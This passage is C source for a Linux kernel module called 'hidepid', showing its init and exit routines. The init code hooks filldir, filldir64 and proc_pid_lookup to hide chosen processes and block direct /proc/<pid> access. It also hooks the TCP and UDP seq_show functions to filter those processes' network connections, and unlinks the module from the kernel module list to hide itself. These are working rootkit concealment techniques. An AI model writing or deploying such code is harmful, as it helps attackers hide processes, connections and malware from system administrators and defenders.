    .proc_release = hidepid_proc_release,
};

/* ==================== 模块入口/退出 ==================== */

static int __init hidepid_init(void) {
    int ret;

    ret = resolve_kln();
    if (ret) {
        hide_err("cannot resolve kallsyms_lookup_name: %d\n", ret);
        return ret;
    }

    ret = resolve_module_symbols();
    if (ret) {
        hide_warn("cannot resolve module symbols, self-hiding disabled: %d\n", ret);
    }

    ret = install_hook(&h_filldir64, "filldir64", hook_filldir64);
    if (ret) {
        hide_err("cannot hook filldir64: %d\n", ret);
        return ret;
    }

    ret = install_hook(&h_filldir, "filldir", hook_filldir);
    if (ret) {
        hide_warn("cannot hook filldir (non-fatal): %d\n", ret);
    }

    /* Hook proc_pid_lookup: 阻断直接访问 /proc/<hidden_pid>/... */
    ret = install_hook(&h_proc_pid_lookup, "proc_pid_lookup",
                       hook_proc_pid_lookup);
    if (ret) {
        hide_warn("cannot hook proc_pid_lookup (non-fatal): %d\n", ret);
        hide_warn("direct /proc/<pid> access will not be blocked\n");
    } else {
        hide_info("proc_pid_lookup hooked: direct /proc/<pid> blocked\n");
    }

    /* Hook 网络连接: 过滤隐藏进程的 TCP/UDP 连接 */
    ret = install_hook(&h_tcp4_seq_show, "tcp4_seq_show", hook_tcp4_seq_show);
    if (ret) hide_warn("cannot hook tcp4_seq_show (non-fatal): %d\n", ret);
    else hide_info("tcp4_seq_show hooked: TCP4 connections filtered\n");

    ret = install_hook(&h_tcp6_seq_show, "tcp6_seq_show", hook_tcp6_seq_show);
    if (ret) hide_warn("cannot hook tcp6_seq_show (non-fatal): %d\n", ret);
    else hide_info("tcp6_seq_show hooked: TCP6 connections filtered\n");

    ret = install_hook(&h_udp4_seq_show, "udp4_seq_show", hook_udp4_seq_show);
    if (ret) hide_warn("cannot hook udp4_seq_show (non-fatal): %d\n", ret);
    else hide_info("udp4_seq_show hooked: UDP4 connections filtered\n");

    ret = install_hook(&h_udp6_seq_show, "udp6_seq_show", hook_udp6_seq_show);
    if (ret) hide_warn("cannot hook udp6_seq_show (non-fatal): %d\n", ret);
    else hide_info("udp6_seq_show hooked: UDP6 connections filtered\n");

    hidepid_entry = proc_create(PROC_NAME, 0600, NULL, &hidepid_proc_ops);
    if (!hidepid_entry) {
        hide_err("cannot create /proc/%s\n", PROC_NAME);
        remove_hook(&h_filldir);
        remove_hook(&h_filldir64);
        return -ENOMEM;
    }

    INIT_DELAYED_WORK(&unload_work, unload_work_fn);
    INIT_DELAYED_WORK(&scan_work, scan_work_fn);

    hide_module_from_list();

    hide_info("loaded (pid + app hiding + auto-scan)\n");
    return 0;
}

static void __exit hidepid_exit(void) {
    stop_scan();
    cancel_delayed_work_sync(&unload_work);

    if (hidepid_entry) {
        proc_remove(hidepid_entry);
        hidepid_entry = NULL;
    }
    clear_hide_pids();
    clear_hide_apps();
    unhide_module_to_list();
    remove_hook(&h_filldir);
    remove_hook(&h_filldir64);
    remove_hook(&h_proc_pid_lookup);
    remove_hook(&h_tcp4_seq_show);
    remove_hook(&h_tcp6_seq_show);
    remove_hook(&h_udp4_seq_show);
    remove_hook(&h_udp6_seq_show);
    hide_info("unloaded\n");
}

module_init(hidepid_init);
module_exit(hidepid_exit);
